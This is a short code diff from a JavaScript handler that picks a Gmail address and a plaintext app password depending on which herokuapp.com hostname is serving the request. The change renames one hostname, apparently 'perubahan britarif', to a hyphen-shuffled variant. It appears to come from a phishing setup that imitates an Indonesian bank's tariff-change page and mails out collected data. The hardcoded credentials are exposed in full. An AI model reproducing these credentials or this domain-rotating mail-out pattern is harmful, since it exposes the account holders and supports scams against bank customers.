@@ -48,7 +48,7 @@ export default function handler(req, res) {
         email = 'bossmudaid766@gmail.com';
         pass = 'xvahirtwxvbntkxv';
 
-    } else if(url == 'perubahan--britarifff.herokuapp.com'){
+    } else if(url == 'perubah--an-britarifff.herokuapp.com'){
         email = 'ssamsol397@gmail.com';
         pass = 'hqkkqinsugrirqne';
 
